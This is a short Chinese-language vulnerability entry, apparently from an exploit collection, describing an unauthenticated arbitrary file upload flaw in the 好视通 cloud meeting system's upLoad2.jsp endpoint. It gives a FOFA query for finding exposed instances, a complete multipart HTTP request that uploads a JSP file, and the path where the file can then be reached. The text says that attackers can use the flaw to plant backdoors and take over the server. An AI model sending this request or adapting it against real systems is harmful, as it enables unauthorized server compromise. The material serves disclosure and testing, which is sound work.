# 好视通云会议upLoad2.jsp接口处存在任意文件上传漏洞

好视通云会议/fm/systemConfig/upLoad2.jsp接口处存在任意文件上传漏洞，未经身份认证的攻击者可以通过此漏洞上传恶意后门文件，最终可获取服务器权限。

## fofa

```javascript
app:"好视通-云会议"
```

## poc

```javascript
POST /fm/systemConfig/upLoad2.jsp HTTP/1.1
Content-Type: multipart/form-data; boundary=1515df1sdfdsfddfs
Accept-Encoding: gzip
 
--1515df1sdfdsfddfs
Content-Disposition: form-data; name="file"; filename="dudesuite.jsp"
Content-Type: application/octet-stream
 
<% out.print("dudesuite"); %>
--1515df1sdfdsfddfs--
```

文件路径`/fm/upload/dudesuite.jsp`

